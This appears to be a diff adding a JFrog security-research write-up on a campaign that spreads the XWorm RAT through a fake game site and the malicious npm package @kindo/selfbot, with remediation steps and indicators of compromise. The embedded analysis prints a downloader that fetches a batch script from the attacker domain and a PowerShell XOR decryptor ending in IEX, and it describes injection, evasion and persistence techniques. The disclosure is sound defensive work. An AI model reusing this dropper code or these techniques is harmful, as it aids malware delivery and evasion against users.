+<h2 id="remediation"><a href="#remediation" aria-hidden="true" tabindex="-1"><strong>Remediation</strong></a></h2>
+<p>If you installed <code>@kindo/selfbot</code> or downloaded "Astral Warfare," assume your system is compromised.</p>
+<h3 id="step-1-containment-and-credential-rotation"><a href="#step-1-containment-and-credential-rotation" aria-hidden="true" tabindex="-1">Step 1: Containment and Credential Rotation</a></h3>
+<p>The malware has full remote access capabilities. Rotate all secrets accessible on the machine:</p>
+<ul>
+<li>Discord tokens  </li>
+<li>npm tokens  </li>
+<li>SSH keys  </li>
+<li>Database credentials  </li>
+<li>Cloud provider keys</li>
+</ul>
+<p>Check Discord for unauthorized messages sent from your account.</p>
+<h3 id="step-2-kill-persistence"><a href="#step-2-kill-persistence" aria-hidden="true" tabindex="-1">Step 2: Kill Persistence</a></h3>
+<p><strong>Windows:</strong></p>
+<p>Delete the scheduled task and persistence files:</p>
+<pre><code>schtasks /delete /tn "applicationbackup_" /f
+Remove-Item "$env:APPDATA\applicationbackup_*.xml" -Force
+Remove-Item "$env:LOCALAPPDATA\applicationbackup_*.vbs" -Force
+</code></pre>
+<h3 id="step-3-cleanup"><a href="#step-3-cleanup" aria-hidden="true" tabindex="-1">Step 3: Cleanup</a></h3>
+<p>Remove malicious artifacts:</p>
+<pre><code>Remove-Item "C:\ProgramData\IntelDrIver" -Recurse -Force
+Remove-Item "C:\ProgramData\IntelDriver" -Recurse -Force
+Remove-Item "$env:USERPROFILE\Downloads\CPU.exe" -Force
+Remove-Item "$env:TEMP\script.bat" -Force
+Remove-Item "$env:TEMP\VBE" -Force
+Remove-Item "$env:TEMP\mapping.csv" -Force
+</code></pre>
+<h3 id="step-4-package-removal"><a href="#step-4-package-removal" aria-hidden="true" tabindex="-1">Step 4: Package Removal</a></h3>
+<p>If you installed the npm package:</p>
+<pre><code class="language-shell">rm -rf node_modules
+npm cache clean --force
+</code></pre>
+<p>Check your <code>package.json</code> for any reference to <code>@kindo/selfbot</code> and remove it.</p>
+<h3 id="step-5-long-term-prevention"><a href="#step-5-long-term-prevention" aria-hidden="true" tabindex="-1">Step 5: Long-Term Prevention</a></h3>
+<ul>
+<li>Run <code>npm config set ignore-scripts true</code> to prevent automatic execution of install hooks  </li>
+<li>Use <a href="https://jfrog.com/curation/" target="_blank" rel="nofollow noopener noreferrer"><strong>JFrog Curation</strong></a> to implement automated dependency scanning and approval workflows</li>
+</ul>
+<h2 id="conclusions"><a href="#conclusions" aria-hidden="true" tabindex="-1"><strong>Conclusions</strong></a></h2>
+<p>This campaign shows threat actors are willing to put in real effort - building a fake game website, coding a Go dropper, and maintaining an npm package - just to get their malware onto developer machines. The multi-stage payload deploys XWorm RAT through multiple obfuscation layers, with anti-analysis checks and process injection to stay hidden.</p>
+<p>If you installed <code>@kindo/selfbot</code> or downloaded "Astral Warfare," treat the machine as compromised. Rotate credentials, kill the persistence, and remove the package. JFrog Xray and JFrog Curation detect this malware.</p>
+<h2 id="indicators-of-compromise-iocs--known-malicious-packages-and-files"><a href="#indicators-of-compromise-iocs--known-malicious-packages-and-files" aria-hidden="true" tabindex="-1"><strong>Indicators of Compromise (IoCs):</strong>  Known Malicious Packages and Files:</a></h2>
+<table>
+<thead>
+<tr>
+<th align="left">Package Name</th>
+<th align="left">Malicious Versions</th>
+<th align="left">Xray ID</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left"><code>@kindo/selfbot</code></td>
+<td align="left">1.0.0, 1.0.1, 1.0.2, 1.0.3, 1.0.4</td>
+<td align="left">XRAY-964727</td>
+</tr>
+</tbody>
+</table>
+<h2 id="file-hashes"><a href="#file-hashes" aria-hidden="true" tabindex="-1">File Hashes:</a></h2>
+<table>
+<thead>
+<tr>
+<th align="left">File</th>
+<th align="left">SHA256</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left"><code>Astral_Warfare.exe</code></td>
+<td align="left"><code>219bd4b681b05addd5364bc9c741065bcdc698560b45c5cbf537561583b66702</code></td>
+</tr>
+<tr>
+<td align="left">Stage 1 BAT</td>
+<td align="left"><code>0b2ce48e4be6a6be85565ce309d2f10cc1b3179a03d25a61f66c6b50fe37b010</code></td>
+</tr>
+<tr>
+<td align="left">Stage 3 PowerShell</td>
+<td align="left"><code>7a8cef4bfa1ca9c24be4886136c30402d4433310283aee22e2da67cbb938b3a9</code></td>
+</tr>
+<tr>
+<td align="left">Stage 4 Shellcode</td>
+<td align="left"><code>1255d41081452cd8fa2358860449bbf3b3494b80282e2bb4ba6b6980ceaf9be1</code></td>
+</tr>
+<tr>
+<td align="left">Stage 5 XWormClient</td>
+<td align="left"><code>c26f8d09e0486aacba414f04c310c6532541d2cdf3f40d95e3fe224d9b77e0a6</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="network-indicators"><a href="#network-indicators" aria-hidden="true" tabindex="-1">Network Indicators</a></h3>
+<ul>
+<li><code>https://astralwarfare[.]fr/script.bat</code>  </li>
+<li><code>https://astralwarfare[.]fr/Astral_Warfare.rar</code>  </li>
+<li>C2: <code>185.94.29.43:7004</code></li>
+</ul>
+<h3 id="file-paths"><a href="#file-paths" aria-hidden="true" tabindex="-1">File Paths</a></h3>
+<ul>
+<li><code>C:\ProgramData\IntelDrIver\rEgX.cmd</code>  </li>
+<li><code>C:\ProgramData\IntelDriver\icon.png</code>  </li>
+<li><code>C:\ProgramData\IntelDriver\windows.ps1</code>  </li>
+<li><code>%USERPROFILE%\Downloads\CPU.exe</code>  </li>
+<li><code>%APPDATA%\applicationbackup_*.xml</code>  </li>
+<li><code>%LOCALAPPDATA%\applicationbackup_*.vbs</code></li>
+</ul>
+</section><!----></div></div></div><footer class="py-4 main-footer bg-black"><div class="container mx-auto px-2"><div class="flex w-full justify-center flex-col sm:flex-row sm:justify-between items-center flex-wrap gap-4"><div class="left"><div class="flex items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a></div></div><div class="right"><ul class="footer-menu flex flex-col sm:flex-row items-center"><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/terms-of-use/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Terms of Use
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/jfrog-cookies-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Cookies Policy
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/privacy-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Privacy Policy
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="#" rel="noopener noreferrer" target="_self" class="text-white ot-sdk-show-settings">
+              Cookies Settings
+            </a></li></ul></div></div><p class="sm:hidden text-center text-white pt-3">
+      ©2026 All Rights Reserved. JFrog Ltd.
+    </p></div></footer></div>
+    <script>window.__INITIAL_STATE__={"data":{"realTimePost":{"description":"Meitar Palas and Shavit Satou, JFrog Security Researchers","title":"Astral Injection: From Fake VideoGame to XWorm RAT via npm and Discord","date":"April 15, 2026","type":"realTimePost","tag":"Real Time Post","img":"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Fastral_injection\u002Fthumbnail.png","path":"\u002Fpost\u002Fastral-injection\u002F","content":"\u003Cp\u003EThe JFrog Security research team have uncovered a malware campaign that spreads the XWorm remote access trojan through multiple channels: a malicious npm package named \u003Ccode\u003E@kindo\u002Fselfbot\u003C\u002Fcode\u003E and a fake game website promoted through hijacked Discord accounts. The attackers use social engineering to trick victims into downloading malware disguised as a legitimate indie game called \"Astral Warfare.\"\u003C\u002Fp\u003E\n\u003Ch2 id=\"the-social-engineering-play\"\u003E\u003Ca href=\"#the-social-engineering-play\" aria-hidden=\"true\" tabindex=\"-1\"\u003E\u003Cstrong\u003EThe Social Engineering Play\u003C\u002Fstrong\u003E\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EThe campaign operates through compromised Discord accounts. Attackers hijack legitimate user accounts, then message the victim's friends with a seemingly innocent request: \"Would you test my new game?\" They provide a link to a professional-looking website at \u003Ccode\u003Eastralwarfare[.]fr\u003C\u002Fcode\u003E along with the password needed to unpack the downloaded file.\n\u003Cimg src=\"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Fastral_injection\u002Fastral_website_hero.png\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe website is convincingly designed, featuring game trailers, a fictional storyline about a guardian named \"Ekis,\" and multiple download buttons. However, the downloaded \u003Ccode\u003EAstral_Warfare.rar\u003C\u002Fcode\u003E file contains nothing but malware.\u003Cbr\u003E\nThe \"Ekis\" game is entirely fabricated, the website's gameplay screenshots are stolen from a legitimate game  called “Elsie” developed by “Knight Shift Games”.  \u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Fastral_injection\u002Fastral_website_lore.png\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Fastral_injection\u002Fdiscord_screen.png\"\u003E\u003C\u002Fp\u003E\n\u003Ch2 id=\"the-npm-vector\"\u003E\u003Ca href=\"#the-npm-vector\" aria-hidden=\"true\" tabindex=\"-1\"\u003E\u003Cstrong\u003EThe npm Vector\u003C\u002Fstrong\u003E\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EIn parallel to the Discord campaign, the attackers also published a malicious npm package:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cstrong\u003EPackage:\u003C\u002Fstrong\u003E \u003Ccode\u003E@kindo\u002Fselfbot\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003EVersions:\u003C\u002Fstrong\u003E 1.0.0 through 1.0.4  \u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003EClaimed purpose:\u003C\u002Fstrong\u003E \"Just a selfbot\"  \u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003EActual purpose:\u003C\u002Fstrong\u003E Malware dropper\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThe package takes advantage of npm's \u003Ccode\u003Epreinstall\u003C\u002Fcode\u003E hook to execute malicious code immediately upon installation. Simply running \u003Ccode\u003Enpm install\u003C\u002Fcode\u003E is enough to trigger the payload.\u003C\u002Fp\u003E\n\u003Ch3 id=\"dual-execution-path\"\u003E\u003Ca href=\"#dual-execution-path\" aria-hidden=\"true\" tabindex=\"-1\"\u003EDual Execution Path\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003EThe package has two triggers:\u003C\u002Fp\u003E\n\u003Col\u003E\n\u003Cli\u003E\u003Cstrong\u003EInstall-time:\u003C\u002Fstrong\u003E The \u003Ccode\u003Epreinstall\u003C\u002Fcode\u003E script in \u003Ccode\u003Epackage.json\u003C\u002Fcode\u003E runs \u003Ccode\u003Escripts\u002Fselfbot.js\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003EImport-time:\u003C\u002Fstrong\u003E \u003Ccode\u003Eindex.js\u003C\u002Fcode\u003E exports the selfbot module, which runs its main function immediately when required\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Cp\u003EEither action - installing or importing - is enough to trigger the payload.\u003C\u002Fp\u003E\n\u003Ch3 id=\"suspicious-self-dependency\"\u003E\u003Ca href=\"#suspicious-self-dependency\" aria-hidden=\"true\" tabindex=\"-1\"\u003ESuspicious Self-Dependency\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003EThe package declares a dependency on itself (\u003Ccode\u003E\"@kindo\u002Fselfbot\": \"^1.0.0\"\u003C\u002Fcode\u003E). That is not normal - either someone republished sloppily.\u003C\u002Fp\u003E\n\u003Ch2 id=\"technical-analysis-the-multi-stage-dropper\"\u003E\u003Ca href=\"#technical-analysis-the-multi-stage-dropper\" aria-hidden=\"true\" tabindex=\"-1\"\u003E\u003Cstrong\u003ETechnical Analysis: The Multi-Stage Dropper\u003C\u002Fstrong\u003E\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EBoth the npm package and the fake game executable follow similar staging patterns to deploy the XWorm RAT.\u003C\u002Fp\u003E\n\u003Ch3 id=\"stage-0-javascript-dropper-npm\"\u003E\u003Ca href=\"#stage-0-javascript-dropper-npm\" aria-hidden=\"true\" tabindex=\"-1\"\u003EStage 0: JavaScript Dropper (npm)\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003EThe \u003Ccode\u003Escripts\u002Fselfbot.js\u003C\u002Fcode\u003E file is obfuscated but deobfuscates to a simple downloader:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-javascript\"\u003Econst url = \"https:\u002F\u002Fastralwarfare.fr\u002Fscript.bat\";\nconst out = join(process.cwd(), \"script.bat\");\n\nasync function download() {\n  \u002F\u002F Downloads script.bat from the attacker's server\n}\n\nasync function run() {\n  \u002F\u002F Executes the batch file via cmd\n}\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe script downloads \u003Ccode\u003Ehttps:\u002F\u002Fastralwarfare[.]fr\u002Fscript.bat\u003C\u002Fcode\u003E and executes it.\u003C\u002Fp\u003E\n\u003Ch3 id=\"stage-0-go-dropper-game-executable\"\u003E\u003Ca href=\"#stage-0-go-dropper-game-executable\" aria-hidden=\"true\" tabindex=\"-1\"\u003EStage 0: Go Dropper (Game Executable)\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003EThe \u003Ccode\u003EAstral_Warfare.exe\u003C\u002Fcode\u003E binary is a 64-bit Go application that:\u003C\u002Fp\u003E\n\u003Col\u003E\n\u003Cli\u003EConcatenates 5,260 embedded string fragments into a large obfuscated Base64 blob  \u003C\u002Fli\u003E\n\u003Cli\u003ERemoves Greek-letter noise using regex \u003Ccode\u003E[αβγδεζηθικλμνξοπ]+\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003EBase64-decodes the cleaned blob into a batch script  \u003C\u002Fli\u003E\n\u003Cli\u003EWrites the batch to \u003Ccode\u003E%TEMP%\\&#x3C;random\u003E.bat\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003EExecutes it via \u003Ccode\u003EShellExecuteW\u003C\u002Fcode\u003E or \u003Ccode\u003Ecmd.exe \u002FC\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Cp\u003EBoth droppers lead to the same Stage 1 batch payload.\u003C\u002Fp\u003E\n\u003Ch3 id=\"stage-1-obfuscated-batch-script\"\u003E\u003Ca href=\"#stage-1-obfuscated-batch-script\" aria-hidden=\"true\" tabindex=\"-1\"\u003EStage 1: Obfuscated Batch Script\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003EThe batch file (\u003Ccode\u003E252,438\u003C\u002Fcode\u003E bytes, \u003Ccode\u003E3,557\u003C\u002Fcode\u003E lines) is heavily obfuscated with:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003EHundreds of junk labels  \u003C\u002Fli\u003E\n\u003Cli\u003EThousands of junk variable assignments  \u003C\u002Fli\u003E\n\u003Cli\u003EFragmented commands assembled from environment variables  \u003C\u002Fli\u003E\n\u003Cli\u003EEmbedded payloads hidden in \u003Ccode\u003E::\u003C\u002Fcode\u003E comment lines and \u003Ccode\u003E@\u003C\u002Fcode\u003E  prefixed lines\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003E\u003Cimg src=\"\u002Fimg\u002FRealTimePostImage\u002Fpost\u002Fastral_injection\u002Ffirst_bat_file.png\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EKey behaviors:\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cstrong\u003EAnti-Analysis Checks:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003EExits if username is \u003Ccode\u003EAdmin\u003C\u002Fcode\u003E or \u003Ccode\u003Eadmin\u003C\u002Fcode\u003E and \u003Ccode\u003E%TEMP%\\VBE\u003C\u002Fcode\u003E or \u003Ccode\u003E%TEMP%\\mapping.csv\u003C\u002Fcode\u003E exists  \u003C\u002Fli\u003E\n\u003Cli\u003EExits if RAM is below 3 GB  \u003C\u002Fli\u003E\n\u003Cli\u003EExits if system or BIOS manufacturer indicates VMware\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003E\u003Cstrong\u003EStaging:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003ECreates \u003Ccode\u003EC:\\ProgramData\\IntelDrIver\u003C\u002Fcode\u003E directory  \u003C\u002Fli\u003E\n\u003Cli\u003ECopies itself to \u003Ccode\u003EC:\\ProgramData\\IntelDrIver\\rEgX.cmd\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003ERecursively marks files as hidden\u002Fsystem\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003E\u003Cstrong\u003EDisguised PowerShell:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003ECopies legitimate \u003Ccode\u003Epowershell.exe\u003C\u002Fcode\u003E to \u003Ccode\u003E%USERPROFILE%\\Downloads\\CPU.exe\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003EHides the renamed binary to reduce obvious PowerShell command lines\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003E\u003Cstrong\u003EPayload Extraction:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003EExtracts all \u003Ccode\u003E::\u003C\u002Fcode\u003E lines into \u003Ccode\u003EC:\\ProgramData\\IntelDriver\\icon.png\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003EExtracts all \u003Ccode\u003E@\u003C\u002Fcode\u003E  lines into \u003Ccode\u003EC:\\ProgramData\\IntelDriver\\logo.jpg\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003EThese are not real images - they contain encrypted payloads\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003E\u003Cstrong\u003EDecryption and Execution:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode\u003E$k = 'd6'  # XOR key\n$d = [Convert]::FromBase64String((Get-Content 'logo.jpg' -Raw))\n$s = ''\n$idx = 0\nforeach ($b in $d) {\n  $s += [char]($b -bxor [byte][char]$k[$idx])\n  $idx++\n  if ($idx -ge $k.Length) { $idx = 0 }\n}\nIEX $s  # Execute decrypted PowerShell\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch3 id=\"stage-2-powershell-loader\"\u003E\u003Ca href=\"#stage-2-powershell-loader\" aria-hidden=\"true\" tabindex=\"-1\"\u003EStage 2: PowerShell Loader\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003EThe decrypted PowerShell loader (\u003Ccode\u003E17,415\u003C\u002Fcode\u003E bytes) uses multiple layers of obfuscation:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003EBase64 + XOR decoding  \u003C\u002Fli\u003E\n\u003Cli\u003EGreek-letter junk insertion  \u003C\u002Fli\u003E\n\u003Cli\u003EROT13-like alphabet shifts for embedded strings\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003E\u003Cstrong\u003EString Decoder Function:\u003C\u002Fstrong\u003E \u003Ccode\u003EMp4Vg7VapA\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EImportant decoded strings include:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ccode\u003ENew-Item\u003C\u002Fcode\u003E, \u003Ccode\u003E-Force | Out-Null\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003EC:\\ProgramData\\IntelDriver\u003C\u002Fcode\u003E, \u003Ccode\u003Ewindows.ps1\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003EProcess names: \u003Ccode\u003Eexplorer\u003C\u002Fcode\u003E, \u003Ccode\u003ESecurityHealthSystray\u003C\u002Fcode\u003E, \u003Ccode\u003EOneDrive\u003C\u002Fcode\u003E, \u003Ccode\u003Esihost\u003C\u002Fcode\u003E, \u003Ccode\u003Etaskhostw\u003C\u002Fcode\u003E, \u003Ccode\u003ERuntimeBroker\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003E\u003Cstrong\u003ECore Functions:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ccode\u003Esi2ah5OX1r\u003C\u002Fcode\u003E: Reads file, strips noise, Base64-decodes  \u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003Eqhx0GpqU7P\u003C\u002Fcode\u003E: Decodes file with XOR  \u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003Elh9NCC9Ejj\u003C\u002Fcode\u003E: Scans process memory for marker bytes \u003Ccode\u003EDE AD BE CA FE BA EF\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003ECchbid97qT\u003C\u002Fcode\u003E: Performs remote-thread injection\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003E\u003Cstrong\u003EPersistence:\u003C\u002Fstrong\u003E If the primary payload path fails, the loader creates a scheduled task:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003ETask name: \u003Ccode\u003Eapplicationbackup_\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003EXML path: \u003Ccode\u003E%APPDATA%\\applicationbackup_.xml\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003EVBS path: \u003Ccode\u003E%LOCALAPPDATA%\\applicationbackup_.vbs\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003EDescription: \u003Ccode\u003EIntelDriver System Service\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003ETrigger: User logon  \u003C\u002Fli\u003E\n\u003Cli\u003EAction: \u003Ccode\u003Ewscript.exe\u003C\u002Fcode\u003E launching the VBS, which runs \u003Ccode\u003EC:\\ProgramData\\IntelDriver\\rEgX.cmd\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003E\u003Cstrong\u003EProcess Injection:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003EPrimary target: \u003Ccode\u003Eexplorer\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003ESecondary targets (after 10 iterations): \u003Ccode\u003ESecurityHealthSystray\u003C\u002Fcode\u003E, \u003Ccode\u003EOneDrive\u003C\u002Fcode\u003E, \u003Ccode\u003Esihost\u003C\u002Fcode\u003E, \u003Ccode\u003Etaskhostw\u003C\u002Fcode\u003E, \u003Ccode\u003ERuntimeBroker\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003EInjects Stage 4 shellcode using \u003Ccode\u003EOpenProcess\u003C\u002Fcode\u003E, \u003Ccode\u003EVirtualAllocEx\u003C\u002Fcode\u003E, \u003Ccode\u003EWriteProcessMemory\u003C\u002Fcode\u003E, \u003Ccode\u003ECreateRemoteThread\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003EInjects up to 20 times with sleeps between attempts\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch3 id=\"stage-3-decoded-payload\"\u003E\u003Ca href=\"#stage-3-decoded-payload\" aria-hidden=\"true\" tabindex=\"-1\"\u003EStage 3: Decoded Payload\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003EThe loader attempts to decode \u003Ccode\u003Eicon.png\u003C\u002Fcode\u003E into \u003Ccode\u003Ewindows.ps1\u003C\u002Fcode\u003E:\u003C\u002Fp\u003E\n\u003Col\u003E\n\u003Cli\u003EStrip \u003Ccode\u003EX\u002FAb\u003C\u002Fcode\u003E noise fragments  \u003C\u002Fli\u003E\n\u003Cli\u003EStrip non-Base64 characters  \u003C\u002Fli\u003E\n\u003Cli\u003EBase64 decode  \u003C\u002Fli\u003E\n\u003Cli\u003EXOR with key \u003Ccode\u003Ed6\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Cp\u003EThe output did not cleanly resolve to plaintext PowerShell in our static analysis, suggesting either an additional nested transform or embedded PE data.\u003C\u002Fp\u003E\n\u003Ch3 id=\"stage-4-injected-shellcode\"\u003E\u003Ca href=\"#stage-4-injected-shellcode\" aria-hidden=\"true\" tabindex=\"-1\"\u003EStage 4: Injected Shellcode\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003EThe shellcode (\u003Ccode\u003E50,369\u003C\u002Fcode\u003E bytes) is position-independent x64 code with:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003EManual PEB-based module resolution  \u003C\u002Fli\u003E\n\u003Cli\u003EAnti-AMS\u002FETW targeting (\u003Ccode\u003Eamsi\u003C\u002Fcode\u003E, \u003Ccode\u003Ewldp\u003C\u002Fcode\u003E, \u003Ccode\u003Entdll\u003C\u002Fcode\u003E, \u003Ccode\u003EEtwEventWrite\u003C\u002Fcode\u003E)  \u003C\u002Fli\u003E\n\u003Cli\u003ECustom ARX\u002FXOR stream decryptor  \u003C\u002Fli\u003E\n\u003Cli\u003EXPRESS-family decompression\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EAfter decryption, it loads a compressed .NET module.\u003C\u002Fp\u003E\n\u003Ch3 id=\"stage-5-xwormclient-rat\"\u003E\u003Ca href=\"#stage-5-xwormclient-rat\" aria-hidden=\"true\" tabindex=\"-1\"\u003EStage 5: XWormClient RAT\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003EThe final payload is \u003Ccode\u003EXWormClient.exe\u003C\u002Fcode\u003E, a .NET RAT with the following configuration:\u003C\u002Fp\u003E\n\u003Ctable\u003E\n\u003Cthead\u003E\n\u003Ctr\u003E\n\u003Cth align=\"left\"\u003EConfig Item\u003C\u002Fth\u003E\n\u003Cth align=\"left\"\u003EValue\u003C\u002Fth\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Fthead\u003E\n\u003Ctbody\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003EC2 Host\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E185.94.29.43\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003EC2 Port\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E7004\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003EProtocol Separator\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E&#x3C;Xwormmm\u003E\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003EGroup\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003EXWorm V7.4\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003EMutex\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003EksUtjUa9iXc5wwbk\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003EUSB Name\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003EUSB.exe\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003ESleep Interval\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1\u003C\u002Fcode\u003E second\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\n\u003C\u002Ftable\u003E\n\u003Cp\u003E\u003Cstrong\u003ECommand Matrix:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Ctable\u003E\n\u003Cthead\u003E\n\u003Ctr\u003E\n\u003Cth align=\"left\"\u003ECommand\u003C\u002Fth\u003E\n\u003Cth align=\"left\"\u003EBehavior\u003C\u002Fth\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Fthead\u003E\n\u003Ctbody\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003Epong\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EKeepalive 